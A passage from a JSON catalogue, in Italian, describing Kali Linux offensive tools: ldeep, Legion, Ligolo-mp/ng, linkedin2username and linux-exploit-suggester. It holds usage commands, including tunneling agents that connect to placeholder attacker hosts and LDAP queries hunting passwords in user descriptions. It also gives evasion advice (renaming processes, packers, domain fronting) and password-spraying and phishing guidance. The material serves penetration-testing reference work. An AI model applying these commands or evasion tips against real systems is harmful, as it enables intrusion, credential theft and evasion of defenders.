password in descrizione (cerca pattern)\nldeep ldap -u user -p pass -d domain.com -s dc users | grep -i 'pass\\|pwd\\|password'\n\n# === GROUP ENUMERATION ===\n# Tutti i gruppi\nldeep ldap -u user -p pass -d domain.com -s dc groups\n\n# Membri di gruppo specifico\nldeep ldap -u user -p pass -d domain.com -s dc membersof \"Domain Admins\"\n\n# Gruppi di un utente\nldeep ldap -u user -p pass -d domain.com -s dc memberships \"targetuser\"\n\n# === DELEGATION ===\n# Account con unconstrained delegation\nldeep ldap -u user -p pass -d domain.com -s dc trustedfordelegation\n\n# Account con constrained delegation\nldeep ldap -u user -p pass -d domain.com -s dc constraineddelegation\n\n# === COMPUTER ENUMERATION ===\n# Tutti i computer\nldeep ldap -u user -p pass -d domain.com -s dc computers\n\n# Computer con LAPS\nldeep ldap -u user -p pass -d domain.com -s dc laps\n\n# === TRUST & GPO ===\n# Trust relationships\nldeep ldap -u user -p pass -d domain.com -s dc trusts\n\n# Group Policy Objects\nldeep ldap -u user -p pass -d domain.com -s dc gpo\n\n# === CACHE MODE (offline analysis) ===\n# Dump tutto in cache\nldeep ldap -u user -p pass -d domain.com -s dc all > dump.json\n\n# Analizza offline\nldeep cache -d domain.com -f dump.json users\nldeep cache -d domain.com -f dump.json membersof \"Domain Admins\"\n\n# === BLOODHOUND INTEGRATION ===\n# Export per BloodHound\nldeep ldap -u user -p pass -d domain.com -s dc bloodhound -o ./bloodhound</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial AD Reconnaissance</strong>, LDeep è uno dei primi tool da usare dopo aver ottenuto credenziali AD valide. Fornisce una mappa completa dell'ambiente: chi sono gli admin, quali trust esistono, dove sono le misconfigurazioni di delegation.</p><p>Durante <strong>Privilege Escalation Path Finding</strong>, le informazioni su delegation e group membership rivelano percorsi di escalation. Account con Unconstrained Delegation sono high-value target. Utenti in gruppi privilegiati meno noti possono avere accesso inaspettato.</p><p>Per <strong>Active Directory Security Assessment</strong>, LDeep aiuta a identificare misconfigurazioni comuni: descrizioni utente con password, account con delegation eccessiva, trust insicuri, GPO abusabili. Il report risultante documenta i rischi per remediation.</p><p>Nel <strong>Offline Analysis</strong>, la cache mode permette di raccogliere dati rapidamente (minimizzando tempo sulla rete) e analizzarli con calma offline. Utile quando la connessione al DC è lenta o limitata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>LDAP Traffic:</strong> LDeep genera query LDAP standard indistinguibili da tool amministrativi legittimi (PowerShell AD module, AD Users & Computers). Tuttavia, query per tutti gli utenti o tutti i computer generano traffico maggiore di uso normale.</p><p><strong>Event Logging:</strong> Se il DC ha audit LDAP abilitato, le query vengono loggate con l'utente che le esegue. Query massive (tutti gli utenti, tutti i gruppi) possono essere notate in ambienti con monitoring LDAP.</p><p><strong>Account Sensitivity:</strong> Usare un account con i minimi privilegi necessari. Anche un utente normale può fare la maggior parte delle query. Evitare di usare account admin per reconnaissance quando possibile.</p><p><strong>Rate Limiting:</strong> Alcuni DC implementano rate limiting su LDAP query. Query molto grandi potrebbero essere rallentate o bloccate. La cache mode permette di fare una query grande una volta e analizzare offline.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "legion",
    "name": "legion",
    "version": "0.4.3",
    "icon": "../app/icons/legion-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/legion/",
    "desc": "Framework GUI per penetration testing con automazione scanning e integrazione tool.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Legion</strong> è un framework GUI open-source per penetration testing che automatizza e orchestra la fase di reconnaissance e vulnerability assessment. Fork del progetto Sparta, Legion modernizza l'interfaccia e aggiunge nuove funzionalità mantenendo il concetto centrale: un'unica dashboard che integra decine di tool di security (Nmap, Nikto, Hydra, dirbuster, enum4linux, snmpwalk, etc.), lanciandoli automaticamente in base ai servizi scoperti sui target. I risultati vengono aggregati in un database SQLite che permette di tracciare lo stato dell'assessment, evitare scan duplicati, e generare report. Ideale per pentester che preferiscono un'interfaccia grafica unificata piuttosto che gestire manualmente decine di terminali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Auto-Scanning:</strong> Dopo un Nmap iniziale, Legion analizza i servizi scoperti e suggerisce/lancia automaticamente tool appropriati: Nikto per web server, enum4linux per SMB, snmpwalk per SNMP, Hydra per servizi autenticati. Riduce drasticamente il lavoro manuale di correlazione servizio-tool.</p><p><strong>Tool Integration Hub:</strong> Integra nativamente: Nmap (con script NSE), Nikto, dirbuster/gobuster, Hydra, enum4linux, snmpwalk, smbclient, fierce, whatweb, wafw00f, screenshot tool. Ogni tool viene configurato automaticamente con parametri appropriati per il target.</p><p><strong>Persistent Database:</strong> Tutti i risultati vengono salvati in database SQLite. Permette di riprendere assessment interrotti, evitare scan già eseguiti, cercare attraverso risultati storici, e mantenere audit trail completo dell'attività.</p><p><strong>Collaborative Features:</strong> Il database può essere condiviso tra membri del team. Più pentester possono lavorare sullo stesso assessment vedendo risultati degli altri. Notes e tagging per organizzare findings.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Legion è primariamente GUI-driven, ma può essere automatizzato via script.</p><pre><code># Avvio interfaccia grafica\nlegion\n# o\nsudo legion  # se richiede privilegi per raw socket\n\n# Workflow tipico da GUI:\n# 1. Click \"New Host(s)\" nella toolbar\n# 2. Inserisci target: IP singolo, range CIDR, o hostname\n# 3. Legion lancia automaticamente Nmap con -sV -O\n# 4. Nella tab \"Services\", visualizza servizi scoperti\n# 5. Click destro su servizio -> Run tool (Nikto, Hydra, etc.)\n# 6. Oppure: Toggle auto-attack per lancio automatico\n# 7. Tab \"Scripts\" per NSE targeting specifico\n# 8. Tab \"Brute\" per credential attacks centralizzati\n# 9. Tab \"Notes\" per annotare findings\n# 10. File -> Export per generare report\n\n# Database location (per backup/sharing)\n# ~/.legion/legion.db\n\n# Import host da file\n# Hosts -> Import -> seleziona file con lista IP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Network Penetration Testing</strong>, Legion accelera drasticamente la fase di reconnaissance. Un singolo click avvia la cascata di scan che manualmente richiederebbe di lanciare e monitorare decine di tool separati.</p><p>Per <strong>Junior Pentesters</strong>, Legion guida attraverso la metodologia suggerendo quali tool usare per ogni servizio. La correlazione automatica servizio-tool incorpora best practice del settore.</p><p>In <strong>Team Assessments</strong>, il database condiviso evita duplicazione di lavoro. Un membro può scansionare subnet mentre un altro analizza i risultati, con visibilità reciproca in tempo reale.</p><p>Per <strong>Documentation e Reporting</strong>, Legion mantiene log completo di ogni scan eseguito con timestamp, facilitando la creazione di report di penetration test con cronologia accurata delle attività.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Noise Profile:</strong> Legion lancia molti scan in parallelo generando traffico significativo. Pattern di reconnaissance evidente: port scan seguito immediatamente da vulnerability scanning su porte aperte. Non adatto per operazioni stealth.</p><p><strong>Tool Signatures:</strong> Ogni tool integrato ha la propria signature riconoscibile. Nikto, dirbuster, Nmap default scans sono trivialmente identificabili da WAF e IDS. Considerare customizzazione delle opzioni per assessment dove la detection è un problema.</p><p><strong>Resource Usage:</strong> Scan multipli simultanei consumano banda e risorse. Su target numerosi, può saturare la rete o causare rate limiting. Configurare parallelismo nelle opzioni.</p><p><strong>Authorization:</strong> Dato il volume di scan generato, usare ESCLUSIVAMENTE su target autorizzati in contesti di penetration testing formale con permesso scritto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "ligolo-mp",
    "name": "ligolo-mp",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-mp/",
    "desc": "Ligolo multiplatform con agent per Windows, Linux e macOS per pivoting avanzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-MP</strong> (Ligolo Multiplatform) è un tool avanzato per tunneling e pivoting attraverso reti segmentate, estendendo le capacità di Ligolo originale con supporto multipiattaforma. Fornisce agent precompilati per Windows, Linux e macOS, permettendo di stabilire tunnel criptati TLS verso qualsiasi sistema operativo compromesso. A differenza di SOCKS proxy tradizionali, Ligolo-MP crea un'interfaccia TUN virtuale sull'attacker machine, permettendo routing diretto del traffico verso la rete interna - questo significa che qualsiasi tool può essere usato normalmente senza bisogno di configurare proxy. Il design è ottimizzato per penetration testing: agent leggeri, comunicazioni criptate, e setup rapido. È la soluzione ideale quando si deve accedere a reti segregate attraverso un host compromesso che può raggiungere entrambi i segmenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUN Interface Approach:</strong> Invece di creare un SOCKS proxy, Ligolo-MP crea un'interfaccia TUN virtuale sull'attacker. Il traffico verso la rete target viene automaticamente routato attraverso il tunnel senza necessità di proxychains o configurazioni per-tool. Qualsiasi applicazione funziona trasparentemente.</p><p><strong>Multiplatform Agent:</strong> Agent disponibili per Windows (x86/x64), Linux (x86/x64/ARM), e macOS (x64/ARM). I binari sono statici e non richiedono dipendenze, funzionando su sistemi minimal o container senza librerie installate.</p><p><strong>TLS Encrypted Tunnel:</strong> Tutte le comunicazioni tra agent e proxy sono criptate con TLS. Supporta certificati self-signed per setup rapido o certificati validi per operazioni che richiedono traffico meno sospetto. Anche il contenuto del tunnel è opaco a ispezione.</p><p><strong>Port Forwarding e Listeners:</strong> Oltre al tunneling completo, supporta port forwarding per casi specifici e listener per reverse connections da sistemi nella rete target che non possono raggiungere direttamente l'attacker.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP PROXY (Attacker Machine) ===\n# Avvia proxy con certificato self-signed\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n\n# Con certificato custom\nligolo-proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:11601\n\n# === DEPLOY AGENT (Target) ===\n# Transfer agent appropriato al target\n# Windows\nagent.exe -connect attacker.com:11601 -ignore-cert\n\n# Linux\nchmod +x agent && ./agent -connect attacker.com:11601 -ignore-cert\n\n# Con retry automatico\n./agent -connect attacker.com:11601 -ignore-cert -retry\n\n# === GESTIONE SESSIONI (Nel Proxy) ===\n# Lista agent connessi\nligolo >> session\n\n# Seleziona agent\nligolo >> session\n[Agent: victim.internal] >> \n\n# Visualizza interfacce del target\n[Agent] >> ifconfig\n\n# === CONFIGURA TUNNEL ===\n# Aggiungi route verso rete interna\n# Prima, crea interfaccia TUN sull'attacker\nsudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\n\n# Aggiungi route verso rete target\nsudo ip route add 10.10.10.0/24 dev ligolo\n\n# Avvia tunnel per questo agent\n[Agent] >> start\n\n# === ORA PUOI ACCEDERE ALLA RETE INTERNA ===\n# Tutti i tool funzionano normalmente!\nnmap -sV 10.10.10.0/24\nsssh user@10.10.10.50\ncurl http://10.10.10.100/api\nsmbclient //10.10.10.30/share\n\n# === PORT FORWARDING ===\n# Forward porta locale verso target interno\n[Agent] >> listener_add --addr 0.0.0.0:8080 --to 10.10.10.100:80\n\n# Ora localhost:8080 raggiunge 10.10.10.100:80\n\n# === DOUBLE PIVOT ===\n# Da primo pivot, deploya secondo agent\n# Il secondo agent si connette al primo che forwarda al proxy\n[Agent] >> listener_add --addr 0.0.0.0:11601 --to ATTACKER:11601\n# Deploy agent sul secondo target che si connette al primo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Penetration Testing</strong>, quando il target interno non è raggiungibile direttamente, Ligolo-MP permette di usare tutti i tool di assessment (Nmap, Metasploit, scripts custom) verso la rete interna come se si fosse connessi localmente. Non serve configurare ogni tool per usare proxy.</p><p>Durante <strong>Red Team Operations</strong>, Ligolo-MP è essenziale per muoversi attraverso reti segmentate. Dopo aver compromesso un host nel perimetro o DMZ, il tunnel dà accesso alle reti interne. Il supporto multiplatform permette pivoting indipendentemente dal SO compromesso.</p><p>Per <strong>Post-Exploitation Access</strong>, una volta stabilito il tunnel, si ha accesso completo alla rete interna per ulteriore exploitation, credential harvesting, e lateral movement. La persistenza dell'agent garantisce accesso continuo.</p><p>Nel <strong>Multi-Hop Pivoting</strong>, Ligolo-MP supporta chaining di tunnel attraverso multiple pivot point, permettendo di raggiungere reti molto segregate attraverso una catena di host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Agent Binary:</strong> L'agent è un binario su disco del sistema compromesso. Può essere rilevato da AV/EDR. I binari precompilati hanno hash noti. Per operazioni avanzate, compilare custom agent con modifiche.</p><p><strong>Outbound Connection:</strong> L'agent stabilisce una connessione outbound TLS verso l'attacker. Firewall egress possono bloccarla. Usare porta 443 e certificato valido per mascherare come HTTPS normale. Il traffic pattern può comunque essere identificato.</p><p><strong>Process Visibility:</strong> Il processo agent è visibile nella lista processi. Nomi come 'agent.exe' sono sospetti. Rinominare in qualcosa di plausibile. Su sistemi Linux, potrebbe essere visibile in /proc.</p><p><strong>Traffic Analysis:</strong> Anche con TLS, il pattern di traffico (connessione persistente, volume elevato durante scan) può essere identificato. Considerare throttling del traffico e timing per operazioni covert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-common-binaries",
    "name": "ligolo-ng-common-binaries",
    "version": "0.8.2",
    "icon": "../app/icons/ligolo-ng-common-binaries-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng-common-binaries/",
    "desc": "Agent ligolo-ng precompilati per Windows, Linux e macOS pronti per il deploy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng Common Binaries è il pacchetto Kali che fornisce gli agent ligolo-ng precompilati per tutte le piattaforme supportate. Ligolo-ng è uno dei tool di tunneling più avanzati per penetration testing, permettendo di creare tunnel TLS crittografati e interfacce tun virtuali per un pivoting trasparente. Questo pacchetto elimina la necessità di compilare gli agent manualmente, fornendo binari pronti per Windows, Linux e macOS in varie architetture, essenziali per deployment rapido durante engagement con target eterogenei.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Platform Coverage:</strong> Include agent precompilati per Windows (x86, x64), Linux (x86, x64, ARM, ARM64), e macOS (x64, ARM64/M1). Questa copertura permette di pivotare attraverso qualsiasi sistema operativo moderno senza ritardi di compilazione.</p><p><strong>Static Binaries:</strong> Gli agent Linux sono compilati staticamente, eliminando dipendenze da librerie dinamiche. Funzionano su qualsiasi distribuzione Linux indipendentemente dalla versione di glibc o altre librerie di sistema.</p><p><strong>Ready for Deployment:</strong> I binari sono organizzati per piattaforma e architettura con naming convention chiara (agent-windows-amd64.exe, agent-linux-arm64, etc.), permettendo di identificare e selezionare rapidamente l'agent corretto per ogni target.</p><p><strong>Synchronized Versions:</strong> Gli agent in questo pacchetto sono sempre sincronizzati con la versione del proxy ligolo-ng in Kali, garantendo compatibilità senza problemi di version mismatch.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I binari sono installati in /usr/share/ligolo-ng/ e pronti per essere copiati e trasferiti sui target.</p><pre><code># Lista agent disponibili\nls -la /usr/share/ligolo-ng/\n\n# Copia agent per il target appropriato\ncp /usr/share/ligolo-ng/agent-windows-amd64.exe ./agent.exe\ncp /usr/share/ligolo-ng/agent-linux-amd64 ./agent\n\n# Transfer su target (esempio via SCP)\nscp agent user@target:/tmp/\n\n# Esecuzione su target Windows\nagent.exe -connect attacker.com:11601 -ignore-cert\n\n# Esecuzione su target Linux\nchmod +x agent && ./agent -connect attacker.com:11601 -ignore-cert\n\n# Con retry automatico in caso di disconnessione\n./agent -connect attacker:11601 -ignore-cert -retry</code></pre><p>L'opzione -ignore-cert è necessaria se il proxy usa certificati self-signed. Per ambienti di produzione, configurare certificati validi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Penetration Test</strong> con target multipli, avere agent precompilati permette di stabilire tunnel rapidamente senza perdere tempo in compilazione, specialmente quando si incontrano architetture diverse (server x64, IoT ARM, etc.).</p><p>Per <strong>Red Team Operations</strong> con accesso limitato alla rete, i binari possono essere pre-staged o trasferiti tramite canali alternativi (USB, phishing payload) e eseguiti immediatamente.</p><p>In scenari di <strong>Incident Response Simulation</strong>, la disponibilità immediata degli agent permette di testare rapidamente la detection capability dell'organizzazione contro tool di tunneling.</p><p>Per <strong>Lab e Training</strong>, non dover compilare ogni volta accelera significativamente l'apprendimento e la pratica delle tecniche di pivoting.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I binari precompilati distribuiti con Kali hanno hash noti e sono presenti nei database di signature di molti antivirus. Windows Defender e altri AV potrebbero bloccare l'esecuzione o generare alert.</p><p><strong>Impatto:</strong> L'agent stabilisce una connessione outbound verso il proxy, che può essere rilevata da firewall e sistemi di monitoring del traffico di rete.</p><p><strong>Mitigazioni:</strong> Per engagement dove la detection è critica, compilare agent custom con modifiche al codice sorgente o utilizzare packer/crypter. Considerare l'uso di porte comuni (443, 80) e domain fronting per mascherare il traffico. Verificare sempre le policy di engagement prima di deployare agent di tunneling.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-kali",
    "name": "ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/ligolo-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng/",
    "desc": "Tunnel TCP/UDP con interfaccia TUN per pivoting completo senza proxy SOCKS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-ng</strong> è un tool di tunneling di nuova generazione che rivoluziona il pivoting in penetration testing creando vere interfacce TUN virtuali. A differenza dei tradizionali proxy SOCKS che richiedono di proxificare ogni tool, Ligolo-ng implementa routing layer 3 trasparente: una volta stabilito il tunnel e configurate le route, qualsiasi tool (Nmap, Metasploit, browser) funziona nativamente senza modifiche. L'architettura agent-proxy usa TLS per comunicazioni crittografate e supporta sia TCP che UDP completo, permettendo anche protocolli come DNS e NTP attraverso il tunnel.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUN Interface Architecture:</strong> Crea interfacce di rete virtuali layer 3 sul sistema attaccante. Tutto il traffico verso le subnet remote viene automaticamente incapsulato nel tunnel senza necessità di proxychains o configurazioni per-tool. Questo permette di usare scan completi, tool grafici, e qualsiasi protocollo.</p><p><strong>Full Protocol Support:</strong> Supporto completo per TCP e UDP attraverso il tunnel. Mentre la maggior parte dei tool di pivoting supporta solo TCP, Ligolo-ng permette di usare DNS, SNMP, NTP, e altri protocolli UDP-based su reti interne.</p><p><strong>Double/Multi Pivot:</strong> Supporta tunneling attraverso host multipli. Un agent su una rete può essere usato per raggiungere una seconda rete, che a sua volta può raggiungere una terza, permettendo di navigare attraverso architetture di rete segmentate.</p><p><strong>Listeners e Port Forwarding:</strong> Permette di esporre servizi locali dell'attaccante verso la rete target (reverse port forward) e di fare port forward da servizi interni verso la macchina attaccante.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ligolo-ng richiede setup iniziale dell'interfaccia TUN e routing sul sistema attaccante.</p><pre><code># === SETUP INIZIALE (una volta) ===\n# Crea interfaccia TUN\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# === AVVIO PROXY ===\n# Avvia il proxy server con certificato self-signed\nligolo-proxy -selfcert\n# Proxy ascolta su porta 11601 di default\n\n# === ESECUZIONE AGENT SUL TARGET ===\n# Trasferisci agent su target e esegui\n./agent -connect attacker.com:11601 -ignore-cert\n# Con auto-retry\n./agent -connect attacker.com:11601 -ignore-cert -retry\n\n# === GESTIONE SESSIONI NEL PROXY ===\n# Lista sessioni connesse\nsession\n# Seleziona sessione (es. 1)\nsession 1\n# Mostra interfacce di rete del target\nifconfig\n# Avvia tunneling sulla sessione\nstart\n\n# === CONFIGURAZIONE ROUTING ===\n# Aggiungi route verso subnet interna\nsudo ip route add 10.10.10.0/24 dev ligolo\nsudo ip route add 172.16.0.0/16 dev ligolo\n\n# === PORT FORWARDING ===\n# Listener: esponi porta locale verso target\nlistener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234\n# Forward: porta interna verso attacker\nlistener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80 --tcp</code></pre><p>Una volta configurate le route, qualsiasi tool funziona nativamente: nmap 10.10.10.0/24, firefox http://10.10.10.5/, etc.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting Completo</strong>, Ligolo-ng permette di accedere a intere subnet interne con tutti i tool disponibili. Nmap scan, Metasploit exploitation, accesso a servizi web interni - tutto funziona come se l'attaccante fosse fisicamente connesso alla rete target.</p><p>Durante <strong>Red Team Operations</strong>, la capacità di multi-pivot permette di navigare attraverso architetture di rete complesse: da DMZ a rete interna, da rete interna a VLAN di management, raggiungendo anche i segmenti più protetti.</p><p>Per <strong>Active Directory Attacks</strong>, il supporto UDP permette di eseguire attacchi Kerberos (AS-REP roasting, Kerberoasting) e DNS-based attacks attraverso il tunnel, cosa impossibile con proxy SOCKS tradizionali.</p><p>In scenari di <strong>Service Exploitation</strong>, i listener permettono di ricevere reverse shell da host interni o esporre servizi (come handler Metasploit) verso la rete target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Detection:</strong> Il tunnel genera traffico TLS outbound dalla vittima verso l'attaccante su porta 11601 (o custom). Questo può essere rilevato da IDS/IPS e firewall. Considerare l'uso di porte comuni (443, 80) e domain fronting per evasione.</p><p><strong>Process Visibility:</strong> L'agent gira come processo separato sul sistema target. EDR e process monitoring possono rilevarlo. Il nome del processo può essere rinominato ma l'attività di rete rimane visibile.</p><p><strong>Traffic Volume:</strong> A differenza di strumenti più furtivi, il pivoting genera traffico proporzionale all'attività. Scan aggressivi attraverso il tunnel creano volumi significativi facilmente notabili nel monitoring.</p><p><strong>Mitigazioni:</strong> Usare certificati validi invece di self-signed, implementare sleep tra le operazioni, preferire query mirate invece di scan completi, e considerare l'uso di proxy intermedi per mascherare l'origine.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linkedin2username",
    "name": "linkedin2username",
    "version": "0.29",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linkedin2username/",
    "desc": "Genera liste di username da profili LinkedIn per password spraying e phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LinkedIn2Username</strong> è uno strumento OSINT Python che automatizza la generazione di liste di username aziendali estraendo informazioni sui dipendenti da LinkedIn. Partendo dal nome di un'azienda, enumera i profili dei dipendenti e trasforma i nomi in username potenzialmente validi secondo i pattern più comuni nelle organizzazioni (john.doe, jdoe, johnd, j.doe, etc.). Questo processo è fondamentale nella fase di reconnaissance pre-attacco per costruire liste di username da utilizzare in attacchi di password spraying contro portali di autenticazione aziendali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LinkedIn Employee Enumeration:</strong> Utilizzando le API di LinkedIn attraverso un account autenticato, enumera tutti i dipendenti associati a una specifica azienda. Supporta la paginazione per estrarre liste complete anche di grandi organizzazioni con migliaia di dipendenti.</p><p><strong>Multi-Format Username Generation:</strong> Genera username in tutti i formati comuni simultaneamente: first.last, flast, firstl, f.last, lastf, last.f, e altri pattern customizzabili. Ogni nome può produrre 10+ varianti, massimizzando la probabilità di trovare il formato corretto usato dall'organizzazione.</p><p><strong>Intelligent Name Handling:</strong> Gestisce correttamente nomi composti, cognomi con prefissi (van, de, von), caratteri speciali, e variazioni internazionali. Normalizza automaticamente caratteri accentati e gestisce casi edge come nomi multipli o iniziali.</p><p><strong>Department and Title Filtering:</strong> Permette di filtrare i risultati per dipartimento, titolo, o posizione geografica. Utile per targetizzare gruppi specifici (IT staff, executive, HR) che potrebbero avere accessi privilegiati o essere più vulnerabili a phishing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>LinkedIn2Username richiede un account LinkedIn valido per autenticarsi. Usare account sacrificabile.</p><pre><code># === ENUMERAZIONE BASE ===\n# Enumera dipendenti e genera username\nlinkedin2username -u your@email.com -c \"Target Company Name\"\n# Inserire password quando richiesta\n\n# === FORMATI SPECIFICI ===\n# Solo formato first.last\nlinkedin2username -u email -c \"Company\" -f \"first.last\"\n\n# Formati multipli separati da virgola\nlinkedin2username -u email -c \"Company\" -f \"flast,first.last,firstl\"\n\n# Tutti i formati disponibili\nlinkedin2username -u email -c \"Company\" -f all\n\n# === OUTPUT E FILTRI ===\n# Salva su file\nlinkedin2username -u email -c \"Company\" -o usernames.txt\n\n# Filtra per keyword nel titolo\nlinkedin2username -u email -c \"Company\" --keyword \"IT\"\nlinkedin2username -u email -c \"Company\" --keyword \"Administrator\"\n\n# Limita numero di risultati\nlinkedin2username -u email -c \"Company\" -n 500\n\n# === OUTPUT AVANZATO ===\n# Include anche nome completo originale\nlinkedin2username -u email -c \"Company\" --include-names\n\n# Aggiungi dominio email\nlinkedin2username -u email -c \"Company\" -d targetcompany.com</code></pre><p>L'output può essere usato direttamente con tool come Spray, Ruler, o Burp Intruder per password spraying.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Spraying Attacks</strong>, la lista di username generata può essere usata contro portali di autenticazione (OWA, O365, VPN, Citrix) con password comuni come 'Season+Year' o 'Company+123'. Avere username validi è essenziale per evitare lockout e massimizzare le probabilità di successo.</p><p>In campagne di <strong>Spear Phishing</strong>, la conoscenza dei nomi completi e dei titoli permette di creare email altamente personalizzate e credibili. Le email che menzionano il nome del destinatario e il suo ruolo hanno tassi di successo significativamente maggiori.</p><p>Per <strong>Social Engineering</strong>, la mappa dell'organigramma aziendale permette di identificare relazioni gerarchiche da sfruttare: impersonare un manager per richiedere azioni urgenti a subordinati, o targetizzare assistenti esecutivi che spesso hanno accessi privilegiati.</p><p>Durante <strong>OSINT Assessment</strong>, la presenza e il numero di dipendenti su LinkedIn fornisce insight sulla struttura organizzativa, sedi, dipartimenti, e tecnologie usate (spesso menzionate nei profili dei tecnici).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Account LinkedIn Risk:</strong> Lo scraping viola i ToS di LinkedIn. Account usati per enumeration estensiva vengono regolarmente bannati. Usare account dedicati/sacrificabili, mai account personali o di valore. I ban possono essere permanenti e estendersi a nuovi account dallo stesso IP.</p><p><strong>Rate Limiting:</strong> LinkedIn implementa rate limiting aggressivo. Query troppo rapide risultano in CAPTCHA, blocchi temporanei, o ban. Implementare delay appropriati tra le richieste e limitare le sessioni giornaliere.</p><p><strong>Nessun Contatto con Target:</strong> Aspetto OPSEC positivo - lo strumento non contatta direttamente l'organizzazione target. Tutte le query passano attraverso LinkedIn. L'azienda non ha visibilità sulle attività di enumeration.</p><p><strong>Attribution:</strong> L'account LinkedIn usato può essere tracciato. Non usare profili collegabili alla propria identità o organizzazione. Considerare l'uso di VPN/proxy per mascherare l'origine delle richieste.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "linux-exploit-suggester",
    "name": "linux-exploit-suggester",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linux-exploit-suggester/",
    "desc": "Suggerisce exploit kernel Linux basandosi su versione e configurazione del sistema.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Linux Exploit Suggester è uno script Bash che automatizza l'identificazione di potenziali exploit kernel per privilege escalation su sistemi Linux. Analizza la versione del kernel in esecuzione, la configurazione del sistema, e i moduli caricati, confrontando queste informazioni con un database costantemente aggiornato di vulnerabilità kernel note (CVE). Per ogni vulnerabilità potenzialmente applicabile, fornisce una valutazione della probabilità di successo, dettagli tecnici, e link diretti a exploit pubblici e PoC. È uno strumento fondamentale nella fase di privilege escalation dopo aver ottenuto un accesso iniziale a basso privilegio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Kernel Analysis:</strong> Estrae automaticamente tutte le informazioni rilevanti: versione kernel esatta, architettura, distribuzione, configurazioni di sicurezza attive (SMEP, SMAP, KASLR, SELinux), e moduli kernel caricati. Queste informazioni sono cruciali per determinare quali exploit sono effettivamente applicabili.</p><p><strong>CVE Database Matching:</strong> Mantiene un database interno di centinaia di vulnerabilità kernel Linux con metadati dettagliati: versioni affette, condizioni necessarie, affidabilità dell'exploit. Il matching considera non solo la versione ma anche le configurazioni che potrebbero bloccare l'exploit.</p><p><strong>Probability Assessment:</strong> Classifica ogni exploit suggerito con un livello di probabilità di successo (Highly Probable, Probable, Less Probable) basato su: match esatto della versione, presenza di condizioni necessarie, storia di affidabilità dell'exploit, e configurazioni di mitigazione attive.</p><p><strong>Actionable Output:</strong> Per ogni vulnerabilità identificata fornisce: CVE ID, descrizione della vulnerabilità, versioni kernel affette, link a exploit-db o GitHub con PoC funzionanti, e note su eventuali requisiti (compilatore, librerie) o limitazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script può essere eseguito direttamente sul target o fornendo manualmente le informazioni di 